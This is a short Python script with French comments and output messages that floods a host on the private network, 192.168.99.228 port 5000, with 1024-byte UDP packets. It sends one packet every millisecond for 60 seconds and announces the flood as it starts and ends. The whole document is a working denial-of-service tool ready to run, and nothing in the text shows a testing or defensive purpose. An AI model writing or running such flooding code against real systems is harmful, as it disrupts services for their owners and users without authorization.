import socket
import time

TARGET_IP = "192.168.99.228"
TARGET_PORT = 5000
MESSAGE_SIZE = 1024
DELAY_BETWEEN_PACKETS = 0.001  # 1 ms
DURATION_SECONDS = 60  # Durée totale de l'envoi en secondes

def flood(duration):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    message = b"A" * MESSAGE_SIZE
    end_time = time.time() + duration

    print(f"Flood vers {TARGET_IP}:{TARGET_PORT} pendant {duration} secondes...")
    while time.time() < end_time:
        sock.sendto(message, (TARGET_IP, TARGET_PORT))
        time.sleep(DELAY_BETWEEN_PACKETS)

    print("Flood terminé.")

if __name__ == "__main__":
    flood(DURATION_SECONDS)
